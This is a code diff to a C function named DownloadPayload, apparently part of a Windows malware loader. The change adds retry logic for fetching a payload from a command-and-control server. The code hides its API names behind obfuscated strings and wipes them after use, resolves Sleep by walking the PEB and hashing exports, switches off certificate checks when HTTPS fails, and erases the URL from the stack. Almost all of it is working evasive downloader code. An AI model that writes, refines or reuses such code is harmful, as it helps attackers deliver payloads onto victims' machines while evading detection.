@@ -66,7 +66,7 @@ BOOL DownloadPayload(
     OUT PBYTE*       ppData,
     OUT PDWORD       pdwSize
 ) {
-    // Deobfuscate DLL name
+    // ---- Resolve WinINet DLL ----
     BYTE xWininet[] = XSTR_WININET_DLL;
     DEOBF(xWininet);
     HMODULE hWinInet = pApi->pLoadLibraryA((LPCSTR)xWininet);
@@ -75,7 +75,7 @@ BOOL DownloadPayload(
         return FALSE;
     }
 
-    // Deobfuscate API names
+    // ---- Resolve WinINet API function pointers (once, before retry loop) ----
     BYTE xA1[] = XSTR_INTERNET_OPEN_A;
     BYTE xA2[] = XSTR_INTERNET_CONNECT_A;
     BYTE xA3[] = XSTR_HTTP_OPEN_REQUEST_A;
@@ -85,26 +85,35 @@ BOOL DownloadPayload(
     BYTE xA7[] = XSTR_INTERNET_SET_OPTION_A;
     BYTE xA8[] = XSTR_INTERNET_QUERY_OPTION_A;
     BYTE xA9[] = XSTR_INTERNET_CRACK_URL_A;
-    DEOBF(xA1); DEOBF(xA2); DEOBF(xA3); DEOBF(xA4);
-    DEOBF(xA5); DEOBF(xA6); DEOBF(xA7); DEOBF(xA8);
-    DEOBF(xA9);
+    BYTE xA10[]= XSTR_HTTP_QUERY_INFO_A;
+    DEOBF(xA1); DEOBF(xA2); DEOBF(xA3); DEOBF(xA4); DEOBF(xA5);
+    DEOBF(xA6); DEOBF(xA7); DEOBF(xA8); DEOBF(xA9); DEOBF(xA10);
 
-    fnInternetOpenA      pInetOpen    = (fnInternetOpenA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA1);
-    fnInternetConnectA   pInetConnect = (fnInternetConnectA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA2);
-    fnHttpOpenRequestA   pHttpOpen    = (fnHttpOpenRequestA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA3);
-    fnHttpSendRequestA   pHttpSend    = (fnHttpSendRequestA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA4);
-    fnInternetReadFile   pInetRead    = (fnInternetReadFile)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA5);
-    fnInternetCloseHandle pInetClose  = (fnInternetCloseHandle)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA6);
-    fnInternetSetOptionA pInetSetOpt  = (fnInternetSetOptionA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA7);
-    fnInternetQueryOptionA pInetQueryOpt = (fnInternetQueryOptionA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA8);
-    fnInternetCrackUrlA  pCrackUrl    = (fnInternetCrackUrlA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA9);
+    fnInternetOpenA        pInetOpen    = (fnInternetOpenA)       pApi->pGetProcAddress(hWinInet, (LPCSTR)xA1);
+    fnInternetConnectA     pInetConnect = (fnInternetConnectA)    pApi->pGetProcAddress(hWinInet, (LPCSTR)xA2);
+    fnHttpOpenRequestA     pHttpOpen    = (fnHttpOpenRequestA)    pApi->pGetProcAddress(hWinInet, (LPCSTR)xA3);
+    fnHttpSendRequestA     pHttpSend    = (fnHttpSendRequestA)    pApi->pGetProcAddress(hWinInet, (LPCSTR)xA4);
+    fnInternetReadFile     pInetRead    = (fnInternetReadFile)    pApi->pGetProcAddress(hWinInet, (LPCSTR)xA5);
+    fnInternetCloseHandle  pInetClose   = (fnInternetCloseHandle) pApi->pGetProcAddress(hWinInet, (LPCSTR)xA6);
+    fnInternetSetOptionA   pInetSetOpt  = (fnInternetSetOptionA)  pApi->pGetProcAddress(hWinInet, (LPCSTR)xA7);
+    fnInternetQueryOptionA pInetQueryOpt= (fnInternetQueryOptionA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xA8);
+    fnInternetCrackUrlA    pCrackUrl    = (fnInternetCrackUrlA)   pApi->pGetProcAddress(hWinInet, (LPCSTR)xA9);
+    fnHttpQueryInfoA       pHttpQuery   = (fnHttpQueryInfoA)      pApi->pGetProcAddress(hWinInet, (LPCSTR)xA10);
 
-    if (!pInetOpen || !pInetConnect || !pHttpOpen || !pHttpSend || !pInetRead || !pInetClose || !pCrackUrl) {
+    // Wipe API name strings immediately after resolution
+    MemSet(xA1,  0, sizeof(xA1));  MemSet(xA2,  0, sizeof(xA2));
+    MemSet(xA3,  0, sizeof(xA3));  MemSet(xA4,  0, sizeof(xA4));
+    MemSet(xA5,  0, sizeof(xA5));  MemSet(xA6,  0, sizeof(xA6));
+    MemSet(xA7,  0, sizeof(xA7));  MemSet(xA8,  0, sizeof(xA8));
+    MemSet(xA9,  0, sizeof(xA9));  MemSet(xA10, 0, sizeof(xA10));
+
+    if (!pInetOpen || !pInetConnect || !pHttpOpen || !pHttpSend ||
+        !pInetRead || !pInetClose || !pCrackUrl) {
         LOG("[!] Failed resolving WinINet");
         return FALSE;
     }
 
-    // Parse URL using InternetCrackUrlA (handles all edge cases)
+    // ---- Parse URL once (before retry loop) ----
     CHAR szHost[256] = { 0 };
     CHAR szPath[512] = { 0 };
 
@@ -124,151 +133,163 @@ BOOL DownloadPayload(
     WORD wPort  = uc.nPort;
     BOOL bHttps = (uc.nScheme == INTERNET_SCHEME_HTTPS);
 
-    LOG("[*] Connecting...");
+    LOG_STR("[*] Download: host = ", szHost);
+    LOG_STR("[*] Download: path = ", szPath);
+    LOG_HEX("[*] Download: port = ", (DWORD)wPort);
+    LOG_HEX("[*] Download: https = ", (DWORD)bHttps);
 
-    // Open session (deobfuscated User-Agent)
-    BYTE xUA[] = XSTR_USER_AGENT;
-    DEOBF(xUA);
-    PVOID hInternet = pInetOpen(
-        (LPCSTR)xUA,
-        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0
-    );
-    if (!hInternet) {
-        LOG("[!] InternetOpen FAILED");
-        return FALSE;
+    // ---- Resolve Sleep for retry delays (kernel32, PEB walk) ----
+    typedef VOID (WINAPI* fnSleepFn)(DWORD);
+    fnSleepFn pSleep = NULL;
+    {
+        PVOID hK32 = FindLoadedModuleW(L"KERNEL32.DLL");
+        if (hK32) pSleep = (fnSleepFn)FetchExportAddress(hK32, Sleep_JOAAT);
     }
 
-    // Connect to host
-    PVOID hConnect = pInetConnect(
-        hInternet, szHost, wPort,
-        NULL, NULL,
-        INTERNET_SERVICE_HTTP, 0, 0
-    );
-    if (!hConnect) {
-        LOG("[!] InternetConnect FAILED");
-        pInetClose(hInternet);
-        return FALSE;
-    }
+    // ================================================================
+    // Retry loop — each iteration opens a fresh WinINet session.
+    // Handles are always closed at the end of each iteration (success
+    // or failure). Buffer ownership is transferred to caller on success.
+    //
+    // Retry triggers: InternetOpen/Connect fail, HttpSendRequest fail,
+    // non-200 HTTP status, 0 bytes received. All indicate transient
+    // conditions (no network yet, C2 temporarily down, TLS error).
+    // ================================================================
+    BOOL bSuccess = FALSE;
 
-    // Build request flags
-    DWORD dwReqFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION;
-    if (bHttps) {
-        dwReqFlags |= INTERNET_FLAG_SECURE
-                    |  INTERNET_FLAG_IGNORE_CERT_CN_INVALID
-                    |  INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
-    }
+    for (DWORD iRetry = 0; iRetry <= NET_RETRY_COUNT && !bSuccess; iRetry++) {
 
-    // Open GET request
-    BYTE xGET[] = XSTR_HTTP_GET;
-    DEOBF(xGET);
-    PVOID hRequest = pHttpOpen(hConnect, (LPCSTR)xGET, szPath, NULL, NULL, NULL, dwReqFlags, 0);
-    if (!hRequest) {
-        LOG("[!] HttpOpenRequest FAILED");
-        pInetClose(hConnect);
-        pInetClose(hInternet);
-        return FALSE;
-    }
+        if (iRetry > 0) {
+            LOG("[*] Download: retrying...");
+            if (pSleep) pSleep(NET_RETRY_DELAY_MS);
+        }
 
-    // Send request - first attempt (will fail on self-signed cert)
-    LOG("[*] Sending request...");
-    BOOL bSent = pHttpSend(hRequest, NULL, 0, NULL, 0);
+        PVOID  hInternet  = NULL;
+        PVOID  hConnect   = NULL;
+        PVOID  hRequest   = NULL;
+        PBYTE  pBuffer    = NULL;
+        SIZE_T sTotalSize = 0;
 
-    // If HTTPS failed (self-signed cert), set flags on SAME handle and retry
-    // MSDN pattern: the SSL context is created by the first attempt,
-    // so security flags can only be modified after it fails
-    if (!bSent && bHttps && pInetSetOpt) {
-        // Query existing security flags on this handle (SSL context exists now)
-        DWORD dwSecFlags = 0;
-        DWORD dwBuffLen  = sizeof(dwSecFlags);
-        if (pInetQueryOpt)
-            pInetQueryOpt(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, &dwBuffLen);
+        // do-while(0) as a break-on-fail block: any `break` jumps to
+        // handle cleanup below without goto.
+        do {
+            // Open session (deobfuscated User-Agent — re-decoded each attempt)
+            BYTE xUA[] = XSTR_USER_AGENT; DEOBF(xUA);
+            hInternet = pInetOpen((LPCSTR)xUA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+            MemSet(xUA, 0, sizeof(xUA));
+            if (!hInternet) { LOG("[!] InternetOpen FAILED"); break; }
 
-        // OR in all cert-ignore flags
-        dwSecFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA
-                    |  SECURITY_FLAG_IGNORE_CERT_CN_INVALID
-                    |  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
-                    |  SECURITY_FLAG_IGNORE_REVOCATION;
-
-        pInetSetOpt(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
-
-        // Retry on SAME handle - SSL context preserved
-        bSent = pHttpSend(hRequest, NULL, 0, NULL, 0);
-    }
-
-    if (!bSent) {
-        LOG("[!] HttpSendRequest FAILED");
-        pInetClose(hRequest);
-        pInetClose(hConnect);
-        pInetClose(hInternet);
-        return FALSE;
-    }
-    LOG("[+] Request sent, reading response...");
-
-    // Verify HTTP 200 OK before reading body
-    BYTE xQueryInfo[] = XSTR_HTTP_QUERY_INFO_A;
-    DEOBF(xQueryInfo);
-    fnHttpQueryInfoA pHttpQuery = (fnHttpQueryInfoA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xQueryInfo);
-    if (pHttpQuery) {
-        DWORD dwStatusCode = 0;
-        DWORD dwStatusLen  = sizeof(dwStatusCode);
-        DWORD dwIndex      = 0;
-        if (pHttpQuery(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
-                       &dwStatusCode, &dwStatusLen, &dwIndex)) {
-            if (dwStatusCode != 200) {
-                LOG("[!] Server returned non-200 status");
-                pInetClose(hRequest);
-                pInetClose(hConnect);
-                pInetClose(hInternet);
-                return FALSE;
+            hConnect = pInetConnect(
+                hInternet, szHost, wPort, NULL, NULL,
+                INTERNET_SERVICE_HTTP, 0, 0
+            );
+            if (!hConnect) {
+                LOG_HEX("[!] InternetConnect FAILED GLE = ", GetLastError());
+                break;
             }
-        }
-    }
 
-    // Read response in chunks
-    SIZE_T  sTotalSize = 0;
-    SIZE_T  sCapacity  = DOWNLOAD_CHUNK_SIZE * 32;
-    PBYTE   pBuffer    = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sCapacity);
-    if (!pBuffer) {
-        pInetClose(hRequest);
-        pInetClose(hConnect);
-        pInetClose(hInternet);
-        return FALSE;
-    }
+            DWORD dwReqFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
+                               INTERNET_FLAG_KEEP_CONNECTION;
+            if (bHttps)
+                dwReqFlags |= INTERNET_FLAG_SECURE
+                           |  INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+                           |  INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
 
-    DWORD dwBytesRead = 0;
-    while (1) {
-        if (sTotalSize + DOWNLOAD_CHUNK_SIZE > sCapacity) {
-            sCapacity *= 2;
-            PBYTE pNew = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sCapacity);
-            if (!pNew) break;
-            MemCopy(pNew, pBuffer, sTotalSize);
+            BYTE xGET[] = XSTR_HTTP_GET; DEOBF(xGET);
+            hRequest = pHttpOpen(hConnect, (LPCSTR)xGET, szPath, NULL, NULL, NULL, dwReqFlags, 0);
+            MemSet(xGET, 0, sizeof(xGET));
+            if (!hRequest) { LOG("[!] HttpOpenRequest FAILED"); break; }
+
+            // Send request — first attempt may fail on self-signed cert
+            LOG("[*] Sending request...");
+            BOOL bSent = pHttpSend(hRequest, NULL, 0, NULL, 0);
+
+            // HTTPS cert bypass: SSL context now exists; set ignore-flags
+            // and retry on the SAME handle (MSDN pattern)
+            if (!bSent && bHttps && pInetSetOpt) {
+                DWORD dwSecFlags = 0, dwBuffLen = sizeof(dwSecFlags);
+                if (pInetQueryOpt)
+                    pInetQueryOpt(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, &dwBuffLen);
+                dwSecFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA
+                           |  SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+                           |  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+                           |  SECURITY_FLAG_IGNORE_REVOCATION;
+                pInetSetOpt(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
+                bSent = pHttpSend(hRequest, NULL, 0, NULL, 0);
+            }
+            if (!bSent) {
+                DWORD dwGLE = GetLastError();
+                LOG("[!] HttpSendRequest FAILED");
+                LOG_HEX("[!] HttpSendRequest GLE = ", dwGLE);
+                break;
+            }
+
+            LOG("[+] Request sent, reading response...");
+
+            // Verify HTTP 200 OK before reading body
+            if (pHttpQuery) {
+                DWORD dwStatusCode = 0, dwStatusLen = sizeof(dwStatusCode), dwIndex = 0;
+                if (pHttpQuery(hRequest,
+                               HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
+                               &dwStatusCode, &dwStatusLen, &dwIndex)) {
+                    if (dwStatusCode != 200) {
+                        LOG_HEX("[!] Server returned HTTP status = ", dwStatusCode);
+                        break;
+                    }
+                }
+            }
+
+            // Read response body in chunks (growing heap buffer)
+            SIZE_T sCapacity = DOWNLOAD_CHUNK_SIZE * 32;
+            pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sCapacity);
+            if (!pBuffer) break;
+
+            DWORD dwBytesRead = 0;
+            while (1) {
+                if (sTotalSize + DOWNLOAD_CHUNK_SIZE > sCapacity) {
+                    sCapacity *= 2;
+                    PBYTE pNew = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sCapacity);
+                    if (!pNew) break;
+                    MemCopy(pNew, pBuffer, sTotalSize);
+                    HeapFree(GetProcessHeap(), 0, pBuffer);
+                    pBuffer = pNew;
+                }
+                if (!pInetRead(hRequest, pBuffer + sTotalSize, DOWNLOAD_CHUNK_SIZE, &dwBytesRead))
+                    break;
+                if (dwBytesRead == 0)
+                    break;
+                sTotalSize += dwBytesRead;
+            }
+
+            if (sTotalSize == 0) { LOG("[!] Downloaded 0 bytes"); break; }
+
+            // Success — transfer buffer ownership to caller
+            *ppData   = pBuffer;
+            *pdwSize  = (DWORD)sTotalSize;
+            bSuccess  = TRUE;
+
+        } while (0);
+
+        // Always close handles for this iteration (safe to call on NULL)
+        if (hRequest)  pInetClose(hRequest);
+        if (hConnect)  pInetClose(hConnect);
+        if (hInternet) pInetClose(hInternet);
+
+        // Free buffer only on failure (success: ownership transferred above)
+        if (!bSuccess && pBuffer)
             HeapFree(GetProcessHeap(), 0, pBuffer);
-            pBuffer = pNew;
-        }
 
-        if (!pInetRead(hRequest, pBuffer + sTotalSize, DOWNLOAD_CHUNK_SIZE, &dwBytesRead))
-            break;
-        if (dwBytesRead == 0)
-            break;
-        sTotalSize += dwBytesRead;
-    }
-
-    pInetClose(hRequest);
-    pInetClose(hConnect);
-    pInetClose(hInternet);
+    } // end retry loop
 
     // Wipe sensitive URL data from stack
     MemSet(szHost, 0, sizeof(szHost));
     MemSet(szPath, 0, sizeof(szPath));
 
-    if (sTotalSize == 0) {
-        LOG("[!] Downloaded 0 bytes");
-        HeapFree(GetProcessHeap(), 0, pBuffer);
+    if (!bSuccess) {
+        LOG("[!] Payload download failed after all retries");
         return FALSE;
     }
 
-    *ppData = pBuffer;
-    *pdwSize = (DWORD)sTotalSize;
     LOG("[+] Payload downloaded");
     return TRUE;
 }
